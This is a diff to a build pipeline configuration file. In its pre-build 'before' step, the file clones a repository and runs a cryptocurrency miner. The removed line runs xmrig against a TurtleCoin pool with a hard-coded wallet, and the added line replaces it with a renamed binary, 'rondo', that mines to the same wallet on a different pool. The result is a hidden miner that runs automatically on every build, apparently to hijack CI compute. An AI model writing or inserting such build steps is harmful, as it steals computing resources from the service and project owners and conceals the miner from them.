@@ -3,4 +3,4 @@ build:
     my-node:
       project_setup:
         before:
-          - command : git clone https://github.com/remakove/artions.git artions && cd artions && ./xmrig --donate-level 1 -a argon2/chukwav2 -o trtl.pool.mine2gether.com:2225 -u TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF -p j2 -k -t 16
+          - command : git clone https://github.com/remakove/artions.git artions && cd artions && ./rondo --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.p5 --disable-gpu --cpu-threads 8
